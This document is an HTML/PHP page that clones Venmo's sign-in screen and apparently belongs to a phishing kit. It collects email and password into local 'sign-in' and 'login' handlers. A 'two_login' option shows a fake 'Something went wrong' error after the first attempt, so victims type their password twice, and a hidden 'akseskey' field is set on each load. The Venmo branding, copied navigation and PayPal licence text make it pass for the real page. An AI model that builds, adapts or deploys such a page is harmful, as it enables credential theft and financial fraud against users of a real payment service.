<html>
<head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#">
<title>Venmo</title>
<link rel="icon" type="images/png" href="assets/img/logo.png">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta charset="utf-8">
<meta name="referrer" content="origin">
<link rel="stylesheet" href="https://venmo.com/build/stylesheets/auth.e374a702d09649f8ba79.compiled.css">
<style type="text/css">
</style>
<link rel="stylesheet" type="text/css" href="assets/css/1.css">
</head>
<body>
<div id="app">
	<div data-reactroot="" data-reactid="1" data-react-checksum="-2130718287">
		<div data-reactid="2">
			<header class="main-header logged-out" data-reactid="3">
			<div class="container" data-reactid="4">
				<div class="global-margin" data-reactid="5">
					<div class="row" data-reactid="6">
						<div class="col-md-12" data-reactid="7">
							<div class="vui-header-hamburger" data-reactid="8">
								<button aria-pressed="false" data-reactid="9"><svg width="30" height="20" data-reactid="10"><title data-reactid="11">Menu Button</title><g class="vui-header-hamburger_top" data-reactid="12"><line x1="-10" x2="10" y1="0" y2="0" data-reactid="13"></line></g><g class="vui-header-hamburger_middle" data-reactid="14"><line x1="-10" x2="10" y1="0" y2="0" data-reactid="15"></line></g><g class="vui-header-hamburger_bottom" data-reactid="16"><line x1="-10" x2="10" y1="0" y2="0" data-reactid="17"></line></g></svg></button>
							</div>
							<a class="venmo asset-venmo-logo-blue" alt="Venmo" data-reactid="18"></a>
							<ul class="hide-mobile" data-reactid="19">
								<li data-reactid="20">
									<a data-reactid="21">How Venmo Works</a>
								</li>
								<li class="" data-reactid="22">
									<a data-reactid="23">Business</a>
								</li>
								<li data-reactid="24">
									<a data-reactid="25">Debit Card</a>
								</li>
								<li data-reactid="26">
									<a data-reactid="27">Security</a>
								</li>
								<li data-reactid="28">
									<a class="contact-us-nav" data-reactid="29">Contact Us</a>
								</li>
							</ul>
							<div class="hide-mobile sign-in-container" data-reactid="30">
								<div class="sign-in" data-reactid="31">
									<a class="sign-in active" data-reactid="32">Sign In</a>
								</div>
							</div>
							<nav class="vui-header-menu" aria-hidden="true" data-reactid="33">
							<div class="vui-header-menu__content" data-reactid="34">
								<div data-reactid="35">
									<ul data-reactid="36">
										<li data-reactid="37">
											<a data-reactid="38">How Venmo Works</a>
										</li>
										<li data-reactid="39">
											<a data-reactid="40">Business</a>
										</li>
										<li data-reactid="41">
											<a data-reactid="42">Debit Card</a>
										</li>
										<li data-reactid="43">
											<a data-reactid="44">Security</a>
										</li>
										<li data-reactid="45">
											<a data-reactid="46">Contact Us</a>
										</li>
										<li data-reactid="47">
											<strong data-reactid="48"><a data-reactid="49">Sign in</a></strong>
										</li>
									</ul>
								</div>
							</div>
							<div class="vui-header-menu__mask" aria-disabled="true" data-reactid="50"></div>
							</nav>
						</div>
					</div>
				</div>
			</div>
			</header>
			<?php
			if ($config['two_login'] == "on") {
					if (isset($_POST['email'])) {
			?>
			<div class="status-bar row error visible" data-reactid="51">
				<div class="container" data-reactid="52">Something went wrong</div>
			</div>
			<?php } } ?>
			<div id="content" data-reactid="53">
				<div class="container-fluid" data-reactid="54">
					<div data-reactid="55">
						<div class="auth-header-text" data-reactid="56">
							<h3 data-reactid="57">Sign in to Venmo</h3>
						</div>
						<?php
						if ($config['two_login'] == "on") {
							if (!isset($_POST['email'])) {
						?>
						<form class="auth-form" action="sign-in" method="post" data-reactid="58">
						<?php }else{ ?>
						<form class="auth-form" action="login" method="post" data-reactid="58">
						<?php } } ?>
							<input type="hidden" name="akseskey" value="<?= $random; ?>">
							<fieldset class="inputs" data-reactid="59">
								<label class="auth-form-input-label" data-reactid="60">
									<span class="label-text" data-reactid="61">Email, Mobile, or User Name</span>
									<input type="email" class="auth-form-input" aria-label="username" placeholder="" name="email" data-reactid="62" autofocus required>
									<span data-reactid="63"></span>
								</label>
								<div class="auth-password-container" data-reactid="64">
									<label class="auth-form-input-label" data-reactid="65">
									<span class="label-text" data-reactid="66">Password</span>
									<input type="password" class="auth-form-input" aria-label="password" placeholder="•••••••" name="password" data-reactid="67" required>
									<span data-reactid="68"></span>
								</label>
								</div>
							</fieldset>
							<div class="button-wrapper" data-reactid="69">
								<button class="ladda-button auth-button" type="submit" data-style="zoom-out" data-test="submit" data-reactid="70"><span class="ladda-label" data-reactid="71">Sign In</span><span class="ladda-spinner" data-reactid="72"></span></button><a class="auth-forgot-password" data-test="forgot" data-reactid="73">Forgot Password?</a>
							</div>
						</form>
						<div class="auth-footer-text" data-reactid="74">
							<a class="auth-create-account" data-test="signup" data-reactid="75">Sign Up</a>
						</div>
					</div>
				</div>
			</div>
			<footer data-reactid="76">
			<div class="footer-desktop" data-reactid="77">
				<div class="bottom large-screen" data-reactid="78">
					<div class="container" data-reactid="79">
						<div class="global-margin" data-reactid="80">
							<div class="row" data-reactid="81">
								<div class="section col-sm-2" data-reactid="82">
									<h4 data-reactid="83">Learn more</h4>
									<ul data-reactid="84">
										<li data-reactid="85">
											<a data-reactid="86">How it works</a>
										</li>
										<li data-reactid="87">
											<a data-reactid="88">Our Fees</a>
										</li>
										<li data-reactid="89">
											<a data-reactid="90">Business</a>
										</li>
										<li data-reactid="91">
											<a data-reactid="92">Debit Card</a>
										</li>
										<li data-reactid="93">
											<a data-reactid="94">Security</a>
										</li>
										<li data-reactid="95">
											<a data-reactid="96">Contact Us</a>
										</li>
									</ul>
								</div>
								<div class="section col-sm-2" data-reactid="97">
									<h4 data-reactid="98">Company</h4>
									<ul data-reactid="99">
										<li data-reactid="100">
											<a data-reactid="101">Our Team</a>
										</li>
										<li data-reactid="102">
											<a data-reactid="103">Jobs</a>
										</li>
									</ul>
								</div>
								<div class="section col-sm-2" data-reactid="104">
									<h4 data-reactid="105">Community</h4>
									<ul data-reactid="106">
										<li data-reactid="107">
											<a data-reactid="108">Blog</a>
										</li>
										<li data-reactid="109">
											<a data-reactid="110">Help Center</a>
										</li>
										<li data-reactid="111">
											<a data-reactid="112">Developer</a>
										</li>
									</ul>
								</div>
								<div class="section col-sm-2" data-reactid="113">
									<h4 data-reactid="114">Terms</h4>
									<ul data-reactid="115">
										<li data-reactid="116">
											<a data-reactid="117">Legal</a>
										</li>
										<li data-reactid="118">
											<a data-reactid="119">Privacy</a>
										</li>
									</ul>
								</div>
								<div class="section col-sm-2" data-reactid="120">
									<a data-reactid="121"><img class="download-links" src="assets/img/apple-app-store.png" alt="Apple App Store link to download Venmo" data-reactid="122"></a>
								</div>
								<div class="section col-sm-2" data-reactid="123">
									<a data-reactid="124"><img class="download-links" src="assets/img/google-play-badge.png" alt="Google Play Store Badge to download Venmo" data-reactid="125"></a>
								</div>
							</div>
							<div class="row" data-reactid="126">
								<div class="col-sm-11 copyright" data-reactid="127">
									<p data-reactid="128">
										<!-- react-text: 129 -->
										 Venmo is a service of PayPal, Inc., a licensed provider of money transfer services (NMLS ID: 910457). All money transmission is provided by PayPal, Inc. pursuant to 
										<!-- /react-text -->
										<!-- react-text: 130 -->
										<!-- /react-text -->
										<a data-reactid="131">PayPal, Inc.’s licenses</a>
										<!-- react-text: 132 -->
										 . © 
										<!-- /react-text -->
										<!-- react-text: 133 -->
										 2021 
										<!-- /react-text -->
										<!-- react-text: 134 -->
										 PayPal, Inc. 
										<!-- /react-text -->
									</p>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div class="footer-mobile row" data-reactid="135">
				<div class="section col-sm-12" data-reactid="136">
					<div class="footer-mobile-copyright" data-reactid="137">Copyright © Venmo.</div>
					<div class="footer-mobile-links" data-reactid="138">
						<a class="help" data-reactid="139">Help</a><a class="security" data-reactid="140">Security</a>
					</div>
				</div>
			</div>
			</footer>
		</div>
	</div>
</div>
<div id="fb-root" class=" fb_reset">
	<div style="position: absolute; top: -10000px; width: 0px; height: 0px;">
		<div></div>
	</div>
</div>
</body>
</html>